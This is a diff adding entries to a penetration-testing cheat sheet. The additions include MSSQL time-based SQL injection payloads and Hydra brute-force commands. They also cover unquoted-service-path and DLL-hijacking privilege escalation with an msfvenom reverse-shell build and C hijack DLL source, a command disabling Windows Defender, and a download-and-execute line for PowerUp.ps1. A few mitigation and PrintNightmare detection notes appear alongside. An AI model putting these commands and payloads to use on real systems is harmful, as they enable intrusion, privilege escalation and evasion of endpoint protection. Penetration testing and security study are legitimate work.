@@ -198,11 +198,16 @@ sp_configure 'xp_cmdshell', '1'
 RECONFIGURE
 EXEC master..xp_cmdshell 'whoami'
 
+# Convert
+select convert(varchar(100),0X54455354);
+
 # sqsh
 sqsh -U sa -P password -S 10.10.10.10
 	* EXEC master..xp_cmdshell 'whoami'
 	* go
-
+	
+# References
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
 ```
 
 ### 2049 (NFS MOUNT)
@@ -373,6 +378,17 @@ union SELECT SYS.DATABASE_NAME,'b',1 FROM v$version--
 ## Extract
 ' union SELECT USERNAME,'b',1 FROM TABLE--
 ' union SELECT USERNAME||':'||PASSWORD,'',1 FROM TABLE--
+
+[MSSQL]
+## Time Based
+;waitfor delay '0:0:10'--
+);waitfor delay '0:0:10'--
+';waitfor delay '0:0:10'--
+');waitfor delay '0:0:10'--
+));waitfor delay '0:0:10'--
+
+## References
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
 ```
 
 ### Hydra
@@ -388,6 +404,16 @@ hydra -L user.txt -P pass.txt 10.10.10.10 ssh -s 2222 -t 30 -f
 
 # Json
 hydra -l admin -P rockyou.txt localhost http-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}:Forbidden' -V -f
+
+# POST
+hydra -l admin -P rockyou.txt 10.10.10.10 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError"
+```
+
+### KeyHacks
+
+```
+# References
+https://github.com/streaak/keyhacks
 ```
 
 ### JsonBrute
@@ -629,6 +655,7 @@ https://github.com/jpillora/chisel
 
 ## Client Machine
 ./chisel client 10.66.67.154:8000 R:25:127.0.0.1:25
+./chisel client 10.66.67.130:8000 R:8080:127.0.0.1:8080
 ./chisel client 10.10.10.10:8001 R:1080:socks
 
 ## Attacker Machine
@@ -750,6 +777,16 @@ wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/ma
 # Commands
 python windows-exploit-suggester.py --update
 python windows-exploit-suggester.py -i systeminfo.txt -d 2021-04-23-mssb.xls
+```
+
+### Sysinternals
+
+```bash
+=====List
+.\Listdlls64.exe dllhijackservice
+
+# References
+https://docs.microsoft.com/en-us/sysinternals/downloads/
 ```
 
 ### Just Another Windows (Enum) Script (JAWS)
@@ -911,6 +948,75 @@ https://lzone.de/cheat-sheet/jq
 
 ```
 
+### Windows Privesc Escalation
+
+```bash
+========Unquoted Service Path========
+-> Check if there is quote or not (")
+-> Check if the directory is writable or not
+-> Check if the service can be restart or not.
+wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+icacls "C:\Program Files\Unquoted Path Service\Common Files"
+sc query "unquotedsvc"
+accesschk.exe -ucqv unquotedsvc
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=9001 -f exe > Common.exe
+sc stop unquotedsvc
+sc start unquotedsvc
+sc qc unquotedsvc
+
+## Unquoted Service Path (Mitigate)
+Get-ItemProperty HKLM::\SYSTEM\CurrentControlSet\Services\unquotedsvc
+(Get-ItemProperty HKLM::\SYSTEM\CurrentControlSet\Services\unquotedsvc).ImagePath
+Set-ItemProperty HKLM::\SYSTEM\CurrentControlSet\Services\unquotedsvc -Name ImagePath -Value '"C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe"'
+sc config unquotedsvc binPath= "\"C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe\""
+
+## References (Unquoted Service Path)
+https://www.techiessphere.com/2017/06/how-to-fix-unquoted-service-path-vulnerability.html?m=1
+https://github.com/VectorBCO/windows-path-enumerate/
+
+========Dll Hijacking========
+-> Check if there is a missing Dll which cannot be loaded (NAME NOT FOUND)
+-> Check if the path to the Dll is writable or not
+-> Check if the service can be restart or not.
+wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows\\"
+sc query dllsvc
+sc queryex dllsvc
+sc stop dllsvc
+sc start dllsvc
+taskkil /F /PID /8080
+
+## windows_dll.c
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Temp\\imhere.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+
+# x86
+i686-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+
+# x64
+x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+
+## References (Dll Hijacking)
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking
+
+========Service binPath========
+
+## References (Changing Service Configuration)
+https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions
+
+========Others========
+
+# References
+https://gist.github.com/sckalath/8dacd032b65404ef7411
+https://github.com/ankh2054/windows-pentest
+```
+
 ### Linux Commands
 
 ```code
@@ -936,6 +1042,9 @@ alias urldecode='sed "s@+@ @g;s@%@\\\\x@g" | xargs -0 printf "%b"'
   * echo 'P%40%24%24w0rd' | urldecode
 alias base64w='iconv --to-code UTF-16LE | base64 -w 0'
   * echo whoami | base64w
+alias hex='xxd -p'
+  * echo -n "hello" | hex
+  * while read line; do echo $line | hex | tr "\n" " " | sed 's/ //g';echo; done < payload.txt
 ```
 
 ### PowerShell Commands
@@ -954,6 +1063,9 @@ wget 10.10.10.10/output.txt -outfile output.txt
 # Find file (recursive)
 Get-ChildItem -Path C:\ -Filter ntds.dit -Recurse -ErrorAction SilentlyContinue -Force
 
+# Disable Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring $true
+
 # View lnk files information
 $sh = New-Object -COM WScript.Shell
 $targetPath = $sh.CreateShortcut('C:\Users\Public\Desktop\shortcut.lnk')
@@ -965,6 +1077,18 @@ $targetPath
 ```bash
 # Commands
 cmdkey /list
+
+# taskkill
+taskkil /F /PID 8071
+
+# sc 
+sc qc servicename
+sc queryex servicename
+sc stop serviceanme
+sc start servicename
+sc query servicename
+
+
 ```
 
 ### Bloodhound
@@ -1369,6 +1493,36 @@ Get-SQLQuery -instance query.bank.local -query "select * from master..sysservers
 https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
 ```
 
+### PowerUp.ps1
+
+```bash
+# Download
+iex(iwr -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1))
+
+# Command
+Invoke-AllChecks
+Find-ProcessDLLHijack
+
+# References
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+```
+
+### Windows Vulnerable Machine (Setup/Ready)
+
+```bash
+# References
+- https://github.com/RedTeamOperations/Vulnerable_Machine/blob/master/Escalate%20-%20A%20Windows%20Vulnerable%20Virtual%20Machine
+- https://github.com/Tib3rius/Windows-PrivEsc-Setup
+```
+
+### Linux Vulnerable Machine (Setup/Ready)
+
+```bash
+# References
+- https://github.com/RedTeamOperations/Vulnerable_Machine/blob/master/Escalate%20-%20A%20Linux%20Vulnerable%20Virtual%20Machine
+
+```
+
 ### Inveigh
 
 ```bash
@@ -1383,6 +1537,7 @@ Invoke-Inveigh -FileOutput Y
 ```
 # Set Proxies
 set PROXIES HTTP:127.0.0.1:8080
+set ReverseAllowProxy true
 
 # Mimikatz
 load mimikatz
@@ -2147,11 +2302,13 @@ git clone https://github.com/helviojunior/MS17-010.git
 msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe > eternalblue.exe
 nc -nlvp 443
 python send_and_execute.py 10.10.10.4 /<fullpath>/eternalblue.exe
+python checker.py 10.10.10.10
 
 # Change username if needed for authentication
 
 # References
 - https://github.com/helviojunior/MS17-010.git
+- https://www.hackers-arise.com/post/2018/11/30/network-forensics-part-2-packet-level-analysis-of-the-eternalblue-exploit
 ```
 
 ### MS08-067
@@ -2487,6 +2644,34 @@ set rhosts 10.10.10.10
 - https://www.picussecurity.com/resource/blog/ttps-hafnium-microsoft-exchange-servers
 ```
 
+### PrintNightmare (CVE-2021-1675)
+
+```bash
+# Download
+https://github.com/afwu/PrintNightmare
+
+# Sysmon (Look into)
+- Event 11 -> spoolsv.exe Writing
+- Event 23 -> Deleting .dll files on C:\Windows\System32\spool\drivers\x64\*
+
+# Disabling Print Spooler Service
+Stop-Service -Name Spooler -Force
+Set-Service -Name Spooler -StartupType Disabled
+
+# Monitor
+- Log entries in Microsoft-Windows-PrintService/Admin
+
+# Enabled
+- Microsoft-Windows-PrintService/Operational logging 
+
+# Detection References
+https://github.com/LaresLLC/CVE-2021-1675
+
+# References
+https://msandbu.org/printnightmare-cve-2021-1675/
+https://www.huntress.com/blog/critical-vulnerability-printnightmare-exposes-windows-servers-to-remote-code-execution
+```
+
 # E. CMS/Web/Application
 
 ### Wordpress
@@ -2713,6 +2898,12 @@ python3 mremoteng_decrypt.py -s "<BASE64>"
 https://www.exploit-db.com/exploits/2017
 ## Commands
 perl exploit.pl 10.10.10.10 10000 /etc/passwd 0
+```
+
+### Jenkins
+
+```bash
+
 ```
 
 # F. Reverse Shell
